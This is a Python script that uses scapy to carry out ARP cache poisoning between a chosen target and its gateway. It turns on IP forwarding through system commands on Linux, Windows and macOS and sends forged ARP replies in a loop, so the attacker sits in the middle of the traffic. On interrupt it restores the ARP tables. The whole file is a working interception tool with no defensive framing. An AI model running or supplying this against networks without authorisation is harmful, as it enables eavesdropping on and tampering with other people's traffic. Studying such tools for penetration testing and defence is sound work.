import scapy.all as scapy
import os
import sys
import time
import optparse


def get_input():

    parse = optparse.OptionParser()

    parse.add_option("-t", "--target", dest="target_ip",
                     help="Targer IP Address")

    parse.add_option("-g", "--gateway", dest="gateway_ip",
                     help="Gateway IP Address ")

    options = parse.parse_args()[0]

    if not options.target_ip and not options.gateway_ip:

        print("Missing Argument!")

        sys.exit()

    return options


def get_mac(ip):

    arp = scapy.ARP(pdst=ip)

    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")

    combine = broadcast/arp

    answer = scapy.srp(combine, timeout=1, verbose=0)[0]

    for i, j in answer:

        return j.hwsrc


def arp_poison(ip1, ip2):

    mac = get_mac(ip1)

    arp = scapy.ARP(op=2, pdst=ip1, hwdst=mac, psrc=ip2)

    scapy.send(arp, verbose=False)


def reset(a, b):

    target_mac = get_mac(a)

    gateway_mac = get_mac(b)

    arp = scapy.ARP(op=2, pdst=a, hwdst=target_mac, psrc=b, hwsrc=gateway_mac)

    scapy.send(arp, verbose=False)


def ip_forward_active():

    if sys.platform in 'linux':

        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

        print("IP Forwarding Activated.")

    if sys.platform in 'win32':

        os.system(
            "reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters /v IPEnableRouter /t REG_DWORD /d 1")

        print("IP Forwarding Activated, Please Restart System.")

    if sys.platform in 'darwin':

        os.system("sysctl -w net.inet.ip.forwarding=1")

        print("IP Forwarding Activated.")


def ip_forward_deactivate():

    if sys.platform in 'linux':

        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")

        print("IP Forwarding Deactivate.")

    if sys.platform in 'win32':

        os.system(
            "reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters /v IPEnableRouter /t REG_DWORD /d 0")

        print("IP Forwarding Deactivated, Please Restart System.")

    if sys.platform in 'darwin':

        os.system("sysctl -w net.inet.ip.forwarding=0")

        print("IP Forwarding Deactivated.")


user_input = get_input()


ip_forward_active()

time.sleep(2)


try:

    while True:

        arp_poison(user_input.target_ip, user_input.gateway_ip)

        print("{}  ->  {}   | Send 1 Packet !".format(user_input.target_ip,
                                                      user_input.gateway_ip))

        arp_poison(user_input.gateway_ip, user_input.target_ip)

        print("{}    ->  {} | Send 1 Packet !".format(user_input.gateway_ip,
                                                      user_input.target_ip))

        time.sleep(3)


except KeyboardInterrupt:

    print("\nClosing & Reseting ARP Table & IP Forwading Deactivated.")

    reset(user_input.target_ip, user_input.gateway_ip)

    reset(user_input.gateway_ip, user_input.target_ip)

    ip_forward_deactivate()

    time.sleep(1)
